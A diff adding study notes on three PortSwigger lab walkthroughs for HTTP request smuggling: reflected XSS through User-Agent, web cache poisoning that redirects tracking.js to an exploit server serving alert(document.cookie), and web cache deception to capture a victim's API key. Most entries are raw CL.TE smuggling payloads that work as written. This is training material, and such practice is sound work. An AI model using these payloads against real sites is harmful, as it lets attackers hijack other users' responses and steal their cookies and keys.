@@ -4261,9 +4261,105 @@ Response: Communication timed out. (chunked size is 5)
     csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test
     ```
   - Copy the user's Cookie header from the comment, and use it to access their account
-- dd 
-- dd
-- dd
+- Exploiting HTTP request smuggling to deliver reflected **XSS**
+  - Info: This lab involves a front-end and back-end server, and the **front-end server doesn't support chunked encoding**. The application is also **vulnerable to reflected XSS via the User-Agent header**. To solve the lab, smuggle a request to the back-end server that causes the next user's request to receive a response containing an XSS exploit that executes alert(1)
+  - https://www.youtube.com/watch?v=nNSf8PrxwW4
+  - View post, Observe that the comment contains "User-Agent" header in a hidden input
+    ```
+    GET /post?postId=10 HTTP/2
+    Host: 0aee00fb03025b1e80857b5d0074006f.web-security-academy.net
+    Cookie: session=JTfQPAnAJUC2HSMLPbeRpf2gty7rzvew
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+
+    Response
+    <form action="/post/comment" method="POST" enctype="application/x-www-form-urlencoded">
+    	<input required type="hidden" name="userAgent" value="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0">
+    ```
+  - smuggle the XSS to the back-end server, so that it exploits the next visitor
+    ```
+    POST / HTTP/1.1
+    Host: 0aee00fb03025b1e80857b5d0074006f.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 151
+    Transfer-Encoding: chunked
+
+    0
+
+    GET /post?postId=10 HTTP/1.1
+    User-Agent: a"/><script>alert(1)</script>
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 5
+
+    x=1
+    ```
+- Exploiting HTTP request smuggling to perform **web cache poisoning**
+  - Info: This lab involves a front-end and back-end server, and the **front-end server doesn't support chunked encoding**. The front-end server is configured to cache certain responses. To solve the lab, perform a request smuggling attack that causes the cache to be poisoned, such that a** subsequent request for a JavaScript file receives a redirection to the exploit server**. The poisoned cache should alert document.cookie.
+  - https://www.youtube.com/watch?v=yeWAViajjHw
+  - view next post, and try smuggling the resulting request with a different Host header. Observe that you can use this request to make the next request to the website get redirected to /post
+    ```
+    POST / HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 129
+    Transfer-Encoding: chunked
+
+    0
+
+    GET /post/next?postId=3 HTTP/1.1
+    Host: anything
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 10
+
+    x=1
+
+    Response on redirection  GET /post/next?postId=1
+    HTTP/2 302 Found
+    Location: https://anything/post?postId=4
+    ```
+  - exploit server
+    file: /post
+    body: alert(document.cookie)
+  - Poison the server cache (when you hit 302 response, proceed to refresh the tracking.js until it redirect to exploit server) - needs several attempt
+    ```
+    POST / HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 193
+    Transfer-Encoding: chunked
+
+    0
+
+    GET /post/next?postId=3 HTTP/1.1
+    Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 10
+
+    x=1
+    ```
+  - the response to the tracking.js request should be a redirect to your exploit server (auto refresh the tracking.js)
+    ```
+    GET /resources/js/tracking.js HTTP/2
+    Location: 
+    
+    ```
+- Exploiting HTTP request smuggling to perform **web cache deception**
+  - Info: This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server is caching static resources. To solve the lab, perform a request smuggling attack such that the next user's request causes their API key to be saved in the cache. Then retrieve the victim user's API key from the cache and submit it as the lab solution. You will need to wait for 30 seconds from accessing the lab before attempting to trick the victim into caching their API key.
+  - https://www.youtube.com/watch?v=7FjXYd4T1oM
+  - Login and Observe that the response doesn't have any anti-caching headers
+  - Smuggle a request to fetch the API key. Repeat this request a few times
+    ```
+    POST / HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 42
+    Transfer-Encoding: chunked
+
+    0
+
+    GET /my-account HTTP/1.1
+    X-Ignore: X
+    ```
+  - Use the Search function on the Burp menu to see if the phrase "Your API Key" has appeared in any static resources OR request GET /resources/js/tracking.js (search "administrator") 
 - dd
 - dd
 - dd
